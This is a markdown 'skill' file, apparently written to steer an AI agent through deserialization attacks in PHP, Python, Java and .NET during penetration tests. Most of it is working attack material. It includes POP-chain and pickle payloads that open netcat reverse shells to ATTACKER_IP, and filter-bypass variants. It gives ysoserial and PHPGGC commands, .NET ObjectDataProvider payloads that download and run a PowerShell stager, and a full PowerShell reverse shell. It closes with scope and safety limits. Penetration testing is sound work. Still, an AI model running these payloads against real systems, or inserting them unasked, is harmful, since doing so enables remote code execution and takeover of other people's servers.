---
name: deserialization
description: Deserialization Attacks — magic bytes identification for PHP/Python/Java/.NET/Ruby, PHP POP chain methodology, Python pickle RCE, Java ysoserial, .NET ObjectDataProvider/TypeConfuseDelegate/ViewState, PHAR deserialization, blind detection via sleep gadgets. Use when HauntMode flags deserialization as APPLIES/MAYBE, when cookies/headers/POST bodies contain base64-encoded blobs or structured data matching known serialization formats, or when the user explicitly says they are testing deserialization.
---

# Deserialization Attacks (CWEE — Introduction + Advanced Deserialization)

Read top-to-bottom on first invocation. Later runs can jump to the relevant language section.

---

## 1. Triggers — when this skill applies

- Cookies containing base64-encoded blobs (especially long ones)
- POST body parameters with base64 or structured data that doesn't look like JSON/JWT
- Import/export settings features (especially PHP apps)
- "Remember me" cookies with complex structured values
- Hidden form fields with base64 or binary-looking data
- API parameters named `session`, `state`, `object`, `data`, `token` containing structured binary
- Any response that reflects back structured data you didn't explicitly submit
- VIEWSTATE parameter in ASP.NET applications
- Ruby Marshal data in cookies (e.g. Rack-based apps)

---

---

## 3. Magic bytes identification table

First step: identify what format you're dealing with. Base64-decode the blob and check the first bytes.

| First bytes (hex) | First bytes (base64 prefix) | Format | Language |
|---|---|---|---|
| `AC ED 00 05 73 72` | `rO0ABXNy` | Java serialized object | Java |
| `AC ED 00 05` | `rO0` | Java serialized object (generic) | Java |
| `00 01 00 00 00 FF FF FF FF` | `AAEAAAD/////` | .NET BinaryFormatter | C#/.NET |
| `O:` | `Tzw` (approx) | PHP serialized object | PHP |
| `a:` | `YTo` | PHP serialized array | PHP |
| `s:` | `czo` | PHP serialized string | PHP |
| `80 04 95` | `gASV` | Python Pickle Protocol 4 (Python 3.8+) | Python |
| `80 03` | `gASU` (approx) | Python Pickle Protocol 3 (Python 3.0-3.7) | Python |
| `80 02` | (starts with `\x80\x02`) | Python Pickle Protocol 2 (Python 2.3+) | Python |
| `80 01` | (starts with `\x80\x01`) | Python Pickle Protocol 1 (Python 2.x) | Python |
| `(l` or `(d` or `(i` | no clean prefix | Python Pickle Protocol 0 (text mode) | Python |
| `04 08` | `BAg` | Ruby Marshal | Ruby |
| `$type` string | varies | .NET Json.NET with type info | C#/.NET |
| `__type` string | varies | .NET JavaScriptSerializer | C#/.NET |

Quick check with bash:
```bash
# Base64 decode a suspected cookie/param and check magic bytes:
echo "BASE64_VALUE_HERE" | base64 -d | xxd | head -3

# Check for Java:
echo "BASE64" | base64 -d | xxd | head -1 | grep -q "ac ed" && echo "JAVA SERIALIZED"

# Check for PHP:
echo "BASE64" | base64 -d | grep -qE "^[aOsibdN]:" && echo "PHP SERIALIZED"

# Check for Python pickle:
echo "BASE64" | base64 -d | xxd | head -1 | grep -qE "8004|8003|8002|8001" && echo "PYTHON PICKLE"

# Check for .NET:
echo "BASE64" | base64 -d | xxd | head -1 | grep -q "0001 0000 00ff ffff ff" && echo ".NET BINARY"
```

---

## 4. Step-by-step exploitation process

```
1. IDENTIFY — Find the serialized data (cookie, POST param, header)
2. DECODE — Base64-decode, identify language/format from magic bytes
3. INSPECT — Decode the object to understand its structure (what class, what fields)
4. FIND GADGETS — Identify exploitable code paths (magic methods, POP chains)
5. CRAFT PAYLOAD — Build the malicious serialized object
6. ENCODE — Base64-encode the payload
7. TEST — Inject, check for RCE/SSRF/LFI via response, timing, or OOB callback
8. ESCALATE — Get reverse shell or further access
```

---

## 5. PHP deserialization

### 5.1 Identifying PHP serialized data

PHP serialization format:
```
a:4:{i:0;s:4:"Test";i:1;s:4:"Data";i:2;a:1:{i:0;i:4;}i:3;s:7:"ACADEMY";}
```
- `a:N:{...}` — array of N elements
- `O:NN:"ClassName":N:{...}` — object of class ClassName with N properties
- `s:N:"string"` — string of length N
- `i:N;` — integer N
- `b:0;` / `b:1;` — boolean false/true

Decode a PHP serialized cookie:
```bash
echo "BASE64_COOKIE" | base64 -d
# Output will look like: O:24:"App\Helpers\UserSettings":4:{...}
```

### 5.2 White-box: finding vulnerable code

Look for `unserialize()` calls that accept user input:
```bash
grep -rn "unserialize(" /var/www/html/
grep -rn "unserialize(" . --include="*.php"
```

Common vulnerable patterns:
```php
$userSettings = unserialize(base64_decode($request['settings']));
$obj = unserialize(base64_decode($_COOKIE['session']));
$data = unserialize(file_get_contents($path));  // PHAR deserialization
```

### 5.3 PHP magic methods — RCE entry points

These methods are automatically called during deserialization and can be chained:

| Magic method | When called | RCE potential |
|---|---|---|
| `__wakeup()` | On `unserialize()` — always | HIGH — common entry point |
| `__destruct()` | When object is garbage-collected after deserialization | HIGH — often executes file/shell ops |
| `__toString()` | When object is used as a string | MEDIUM — triggers when the result is echoed |
| `__invoke()` | When object is called as a function | MEDIUM |
| `__get($name)` | When accessing undefined property | MEDIUM — can trigger DB queries |
| `__call($name, $args)` | When calling undefined method | LOW-MEDIUM |
| `__unserialize()` | PHP 7.4+ replacement for `__wakeup` | HIGH |

**POP chain methodology** (Property-Oriented Programming):

1. Find the deserialization entry point (`unserialize()` call)
2. Look at all classes in the codebase for magic methods
3. Find a magic method that calls dangerous functions: `system()`, `exec()`, `shell_exec()`, `file_put_contents()`, `eval()`
4. Check if the dangerous function's arguments come from object properties (which you control)
5. If a single gadget doesn't reach RCE, chain: `__wakeup` creates object A → A's `__toString` calls B's method → B executes shell command

**Example chain** (from HTBank lab):
- `UserSettings.__wakeup()` calls `echo $this->name` in a shell context
- Set `name` property to `"; nc -nv ATTACKER_IP 4444 -e /bin/bash;#`
- Serialize the object, base64-encode, submit → reverse shell

### 5.4 Crafting PHP exploit payloads

**Privilege escalation via object properties** (no RCE, just data manipulation):
```php
<?php
// Run locally — include the target class file first
include('UserSettings.php');

$payload = new \App\Helpers\UserSettings(
    'pentest',
    'admin@targetdomain.com',  // email that grants admin
    '$2y$10$BCRYPT_HASH_OF_KNOWN_PW',
    'default.jpg'
);

echo base64_encode(serialize($payload)) . PHP_EOL;
```

**RCE via shell_exec in magic method**:
```php
<?php
include('UserSettings.php');

$evil_name = '"; nc -nv ATTACKER_IP 4444 -e /bin/bash;#';
$payload = new \App\Helpers\UserSettings(
    $evil_name,
    'attacker@targetdomain.com',
    '$2y$10$BCRYPT_HASH',
    'default.jpg'
);

echo base64_encode(serialize($payload)) . PHP_EOL;
```

### 5.5 PHPGGC — gadget chain generator

When the target uses a known framework (Laravel, Symfony, WordPress, Drupal, etc.):

```bash
# List available gadget chains for a framework
./phpggc -l Laravel
./phpggc -l Symfony
./phpggc -l CodeIgniter4
./phpggc -l Monolog

# Generate RCE payload (base64 output)
./phpggc Laravel/RCE9 system 'nc -nv ATTACKER_IP 4444 -e /bin/bash' -b

# Generate PHAR payload for PHAR deserialization
./phpggc -p phar Laravel/RCE9 system 'nc -nv ATTACKER_IP 4444 -e /bin/bash' -o exploit.phar
```

### 5.6 PHAR deserialization

When you have: (1) arbitrary file upload and (2) a `file_exists()` / `file_get_contents()` / other filesystem function that accepts user-controlled paths.

```php
<?php
// Generate exploit.phar — run this locally with phar.readonly = Off in php.ini
include('TargetClass.php');

$phar = new Phar("exploit.phar");
$phar->startBuffering();
$phar->addFromString('test.txt', 'test');
$phar->setStub("<?php __HALT_COMPILER(); ?>");
$phar->setMetadata(new \App\Helpers\TargetClass(
    '"; nc -nv ATTACKER_IP 4444 -e /bin/bash;#',
    'admin@target.com',
    '$2y$10$HASH',
    'default.jpg'
));
$phar->stopBuffering();
```

If you get `phar.readonly` error:
```bash
# Edit /etc/php/7.4/cli/php.ini
phar.readonly = Off
```

Steps:
1. Upload `exploit.phar` (rename to `.jpg` if extension filtering) 
2. Get the upload path (copy image link from profile)
3. Access `http://target/image?_=phar://uploads/UPLOADED_FILE.jpg` — triggers deserialization

---

## 6. Python deserialization

### 6.1 Identifying Python pickle

```bash
# Base64 decode and check
echo "COOKIE_VALUE" | base64 -d | xxd | head -1
# Look for: 80 04 95 (Protocol 4), 80 03 (Protocol 3), 80 02 (Protocol 2)
```

Python pickle text protocol (protocol 0) looks like:
```
(lp0\nS'Test'\np1\na...
```

### 6.2 Privilege escalation — forge a pickled session object

When the app uses pickle to serialize session data but you know the class structure:

```python
#!/usr/bin/env python3
import pickle
import base64

# Mimic the target's Session class structure
class Session:
    def __init__(self, username, role):
        self.username = username
        self.role = role

# Forge an admin session
forged = Session("attacker", "admin")
forged_pickle = pickle.dumps(forged)
print(base64.b64encode(forged_pickle).decode())
```

Replace the auth cookie with this value.

### 6.3 Python pickle RCE — `__reduce__` method

The `__reduce__` magic method tells pickle how to reconstruct an object. If it returns a callable and args, pickle calls `callable(*args)`:

```python
#!/usr/bin/env python3
import pickle
import base64
import os
import sys

ATTACKER_IP = sys.argv[1]
ATTACKER_PORT = sys.argv[2]

class RCE:
    def __reduce__(self):
        return (os.system, (f"nc -nv {ATTACKER_IP} {ATTACKER_PORT} -e /bin/bash",))

payload = base64.b64encode(pickle.dumps(RCE())).decode()
print(payload)
```

Run: `python3 exploit.py ATTACKER_IP 4444`

Set the auth cookie to the output, then start listener: `nc -lvnp 4444`

**Filter bypass** — if the blacklist blocks `nc`, `/bash`, `subprocess`, `Popen`:
```python
class RCE:
    def __reduce__(self):
        # Use string concatenation or shell quoting to bypass substring blacklist
        cmd = f"n''c -nv {ATTACKER_IP} {ATTACKER_PORT} -e /bin/s''h"
        return (os.system, (cmd,))
```

**Python reverse shell without nc** (when nc is blocked):
```python
class RCE:
    def __reduce__(self):
        cmd = (
            f"python3 -c 'import socket,subprocess,os;"
            f"s=socket.socket();s.connect((\"{ATTACKER_IP}\",{ATTACKER_PORT}));"
            "os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
            "subprocess.call([\"/bin/sh\",\"-i\"])'"
        )
        return (os.system, (cmd,))
```

### 6.4 PyYAML deserialization RCE

If the app uses `yaml.load()` (without `Loader=yaml.SafeLoader`):
```yaml
!!python/object/apply:os.system
args: ['nc -nv ATTACKER_IP 4444 -e /bin/bash']
```

Or:
```yaml
!!python/object/new:subprocess.Popen
args: [['nc', '-nv', 'ATTACKER_IP', '4444', '-e', '/bin/bash']]
```

---

## 7. Java deserialization

### 7.1 Identifying Java serialized data

```bash
echo "BASE64" | base64 -d | xxd | head -1
# Look for: ac ed 00 05 — Java magic bytes
# Base64 indicator: starts with rO0 (rO0AB = AC ED 00 05 in base64)
```

### 7.2 ysoserial — gadget chain generator

[RUN THIS] — ysoserial requires Java:

```bash
# List available gadget chains
java -jar ysoserial.jar 2>&1 | head -40

# Generate RCE payload with common gadget chains (try all):
java -jar ysoserial.jar CommonsCollections1 'nc -e /bin/bash ATTACKER_IP 4444' | base64 -w0
java -jar ysoserial.jar CommonsCollections6 'nc -e /bin/bash ATTACKER_IP 4444' | base64 -w0
java -jar ysoserial.jar CommonsCollections7 'nc -e /bin/bash ATTACKER_IP 4444' | base64 -w0
java -jar ysoserial.jar Spring1 'nc -e /bin/bash ATTACKER_IP 4444' | base64 -w0
java -jar ysoserial.jar ROME 'nc -e /bin/bash ATTACKER_IP 4444' | base64 -w0
java -jar ysoserial.jar Jdk7u21 'nc -e /bin/bash ATTACKER_IP 4444' | base64 -w0
```

Start listener: `nc -lvnp 4444`

Replace the serialized cookie/parameter with the base64 payload.

### 7.3 Blind detection (timing-based)

When you can't see command output, use a sleep gadget to confirm execution:

[RUN THIS]:
```bash
# Ping-based detection (4 pings = ~4 second delay)
java -jar ysoserial.jar CommonsCollections1 'ping -c 4 YOUR_IP' | base64 -w0
# Then listen: sudo tcpdump -i tun0 icmp

# Sleep-based detection
java -jar ysoserial.jar CommonsCollections6 'sleep 5' | base64 -w0
# Measure response time — 5+ second delay = RCE confirmed
```

---

## 8. .NET deserialization

### 8.1 Identifying .NET serialized data

| Indicator | Format |
|---|---|
| Base64 starts with `AAEAAAD/////` | BinaryFormatter binary |
| JSON contains `$type` key | Json.NET with TypeNameHandling |
| JSON contains `__type` key | JavaScriptSerializer with SimpleTypeResolver |
| JSON contains `TypeObject` | Various .NET serializers |
| Cookie named `__VIEWSTATE` | ASP.NET ViewState (ObjectStateFormatter) |
| Cookie named `REMEMBERME` with structured value | Custom serialization |

White-box: search for vulnerable deserializer calls:
```powershell
Select-String -Pattern "\.Deserialize\(" -Path "*/*" -Include "*.cs"
```

Or using grep on decompiled source:
```bash
grep -rn "\.Deserialize\b" --include="*.cs" .
grep -rn "JSON\.ToObject\|DeserializeObject\|ReadObject" --include="*.cs" .
```

### 8.2 ObjectDataProvider gadget — Json.NET / JavaScriptSerializer

When the app uses Json.NET with `TypeNameHandling.All` or `TypeNameHandling.Objects`, or JavaScriptSerializer with `SimpleTypeResolver`:

**Ping test (confirm RCE, no egress needed):**
```json
{"$type":"System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35","ObjectInstance":{"$type":"System.Diagnostics.Process, System"},"MethodParameters":{"$values":["C:\\Windows\\System32\\cmd.exe","/c ping -n 4 YOUR_IP"]},"MethodName":"Start"}
```

Listen: `sudo tcpdump -i tun0 icmp`

**Reverse shell (download stager):**

First, serve a PowerShell reverse shell as `s.ps1`:
```powershell
$client = New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',443);
$stream = $client.GetStream();
$buffer = New-Object System.Byte[] 1024;
while(($i = $stream.Read($buffer, 0, $buffer.Length)) -ne 0){
  $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($buffer,0,$i);
  try { $output = (iex $data 2>&1 | Out-String) } catch { $output = $_.Exception.Message }
  $output += 'PS ' + (pwd).Path + '> ';
  $bytes = ([System.Text.Encoding]::ASCII).GetBytes($output);
  $stream.Write($bytes,0,$bytes.Length);
  $stream.Flush();
}
$client.Close();
```

Start: `python3 -m http.server 8000` and `rlwrap nc -lvnp 443`

```json
{"$type":"System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35","ObjectInstance":{"$type":"System.Diagnostics.Process, System"},"MethodParameters":{"$values":["C:\\Windows\\System32\\cmd.exe","/c powershell -NoP -W Hidden -Exec Bypass -c IEX((New-Object Net.WebClient).DownloadString('http://ATTACKER_IP:8000/s.ps1'))"]},"MethodName":"Start"}
```

**Note**: `"MethodParameters"` must come BEFORE `"MethodName":"Start"` — order matters.

### 8.3 XmlSerializer with ObjectDataProvider

For XML-based deserialization:
```xml
<Tee xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema">
  <ProjectedProperty0>
    <ObjectInstance xsi:type="XamlReader"/>
    <MethodName>Parse</MethodName>
    <MethodParameters>
      <anyType xsi:type="xsd:string">&lt;ObjectDataProvider MethodName="Start" xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation" xmlns:sd="clr-namespace:System.Diagnostics;assembly=System" xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"&gt;&lt;ObjectDataProvider.ObjectInstance&gt;&lt;sd:Process&gt;&lt;sd:Process.StartInfo&gt;&lt;sd:ProcessStartInfo FileName="C:\Windows\System32\cmd.exe" Arguments="/c powershell -NoP -W Hidden -Exec Bypass -c IEX((New-Object Net.WebClient).DownloadString('http://ATTACKER_IP:8000/s.ps1'))"&gt;&lt;/sd:ProcessStartInfo&gt;&lt;/sd:Process.StartInfo&gt;&lt;/sd:Process&gt;&lt;/ObjectDataProvider.ObjectInstance&gt;&lt;/ObjectDataProvider&gt;</anyType>
    </MethodParameters>
  </ProjectedProperty0>
</Tee>
```

Type parameter (pass in a separate `type` field if required):
```
System.Data.Services.Internal.ExpandedWrapper`2[[System.Windows.Markup.XamlReader, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35],[System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35]], System.Data.Services, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089
```

### 8.4 BinaryFormatter — TypeConfuseDelegate gadget

For binary deserialization (BinaryFormatter, LosFormatter, ObjectStateFormatter):

[RUN THIS] using ysoserial.NET:
```powershell
# List available formatters and gadgets
.\ysoserial.exe --help
.\ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -c "calc" -o base64

# Reverse shell payload
.\ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -c "powershell -NoP -W Hidden -Exec Bypass -c IEX((New-Object Net.WebClient).DownloadString('http://ATTACKER_IP:8000/s.ps1'))" -o base64 > payload.b64

# Other formatters to try:
.\ysoserial.exe -f Json.Net -g ObjectDataProvider -c "calc" -o Raw
.\ysoserial.exe -f XmlSerializer -g ObjectDataProvider -c "calc" -o Raw
```

### 8.5 ViewState exploitation

ASP.NET ViewState is stored in `__VIEWSTATE` form field or `__VIEWSTATE` cookie. It uses ObjectStateFormatter (BinaryFormatter underneath).

If ViewState is not MAC-validated (or you know the `machineKey`):

[RUN THIS]:
```powershell
.\ysoserial.exe -f ObjectStateFormatter -g TypeConfuseDelegate -c "cmd /c ping -n 4 ATTACKER_IP" -o base64
```

Or use `blacklist3r` tool to brute-force the machineKey if the app leaks enough ViewState samples.

---

## 9. Blind deserialization detection

When you can inject but can't see output:

### 9.1 Time-based sleep gadget (universal test)

For Java:
```bash
[RUN THIS]
java -jar ysoserial.jar CommonsCollections6 'sleep 5' | base64 -w0
# Inject and measure response time. 5+ second delay = RCE confirmed.
```

For Python pickle — inject a time.sleep payload:
```python
class TimeTest:
    def __reduce__(self):
        return (__import__('time').sleep, (5,))
encoded = base64.b64encode(pickle.dumps(TimeTest())).decode()
```

For PHP — `__destruct` with `sleep()`:
```php
// If the target class has __destruct calling sleep or similar timing operation
// More practical: try injecting a DNS lookup using shell commands
```

### 9.2 OOB DNS/HTTP probe

For Java (ysoserial with DNS lookup):
```bash
[RUN THIS]
java -jar ysoserial.jar URLDNS "http://UNIQUE_ID.YOUR_EZXSS_DOMAIN" | base64 -w0
```

Check ezXSS dashboard for DNS/HTTP callbacks. URLDNS gadget works on virtually all Java apps regardless of classpath — it only triggers a DNS lookup, not full RCE.

For Python pickle (HTTP callback):
```python
class OOBProbe:
    def __reduce__(self):
        import urllib.request
        return (urllib.request.urlopen, (f"YOUR_EZXSS_DOMAIN/deser-python",))
```

---

## 10. False-positive checks

- **Base64 blob that decodes to JWT** — JWTs have three `.`-separated base64 sections with a JSON header. Not deserialization. Test with `jwt` skill / header manipulation.
- **PHP serialized data but no `unserialize()` call reachable** — the app may only use it for export, not import. Confirm by checking if importing the modified serialized blob changes app state.
- **Java magic bytes but payload causes 500 error on every gadget** — the server may have serialization filtering (e.g., JEP 290). Try different gadget chains, or pivot to blind OOB-only testing.
- **Python pickle but blacklist blocks all shell commands** — try `urllib.request` for OOB proof, then work around the blacklist with string concatenation, `chr()`, `eval()`, etc.
- **TypeConfuseDelegate payload rejected** — try ObjectDataProvider, or if it's Json.NET specifically, add full assembly-qualified type names.
- **Sleep payload caused delay but shell payload didn't fire** — command may be executing but no network egress. Try writing a file to webroot instead: `/c echo RCE > C:\inetpub\wwwroot\rce.txt`

---

## 11. Chain candidates

| Chain | Other skill | Impact |
|---|---|---|
| Deserialization RCE → webshell planted | `file-upload`, `cmdi` | Persistent server access |
| PHP `__get` → SQL query | `sqli` | SQLi via deserialization |
| PHAR deserialization + file upload | `file-upload` | Combined upload+deser RCE |
| Deserialization → read files → credential theft | `lfi` | Source code / config access |
| .NET ViewState → RCE (no auth needed) | `auth-bypass` | Pre-auth RCE |
| Python pickle in cookie → forge admin role | `idor`, `auth-bypass` | Privilege escalation |
| Java URLDNS → SSRF pivot | `ssrf` | Internal network access |

---

## 12. Reporting template

```
POTENTIAL FINDING: Insecure Deserialization — <RCE | Privilege Escalation | SSRF | Blind>
Target: <full URL of vulnerable endpoint>
Parameter: <cookie name / POST param / header where serialized data is accepted>
Language/format: <PHP (a:/O:) | Python Pickle | Java (rO0) | .NET (AAEAAAD) | Ruby>
Identification method: <magic bytes / exiftool / behavioral analysis / source code>
Gadget/chain: <custom POP chain | phpggc Laravel/RCE9 | ysoserial CommonsCollections6 | ODP TypeConfuseDelegate>
Working payload:
    <base64 payload or command used>
Evidence:
    <RCE output showing whoami/id, timing delay, OOB callback, privilege change>
Impact:
    <Remote code execution as www-data | Admin privilege escalation | Arbitrary file read>
Chain potential: <SQL injection via deserialized query, file upload + PHAR pivot>
Next step: <escalate webshell, pivot to internal network, dump credentials>
```

---

## 13. Recon tracker vector strings

Only log if user explicitly authorizes:

- `deser:php-rce:<endpoint>` — PHP deserialization RCE confirmed
- `deser:php-priv-esc:<endpoint>` — PHP deserialization privilege escalation
- `deser:php-phar:<endpoint>` — PHAR deserialization confirmed
- `deser:python-pickle-rce:<endpoint>` — Python pickle RCE confirmed
- `deser:python-pickle-forge:<endpoint>` — Pickle session forgery (priv esc)
- `deser:java-rce:<gadget>` — Java deserialization RCE via named gadget
- `deser:java-urldns` — Java URLDNS OOB callback confirmed
- `deser:dotnet-odp` — .NET ObjectDataProvider RCE
- `deser:dotnet-viewstate` — ViewState exploitation confirmed
- `deser:blind-timing` — Blind confirmation via sleep gadget
- `deser:no:<reason>` — Tested, not exploitable (filtering, no magic methods, safe deserializer)

---

## 14. What NOT to do

- **Do not use destructive commands** in RCE payloads. Use `id`, `whoami`, `hostname` for PoC. Do not delete files, modify system configuration, or install backdoors beyond what is needed.
- **Do not run ysoserial on production** with aggressive payloads before confirming the gadget chain with a safe timing/DNS probe first. Wrong gadgets cause application crashes.
- **Do not use BinaryFormatter payloads on .NET Core applications.** BinaryFormatter is not available in .NET Core by default — it will crash the app. Test for Core vs. Framework first.
- **Do not submit sleep payloads longer than 10 seconds.** On production systems this causes request timeouts and appears as DoS.
- **Do not try billion laughs / bomb payloads** in any XML-based deserialization context. They cause DoS.
- **Do not auto-log to the recon tracker** without explicit user instruction (CLAUDE.md hard rule).
- **Do not leave planted webshells.** Clean up any files written as part of exploitation PoC.
- **Do not chain into out-of-scope systems** even if deserialization gives you lateral movement capability.
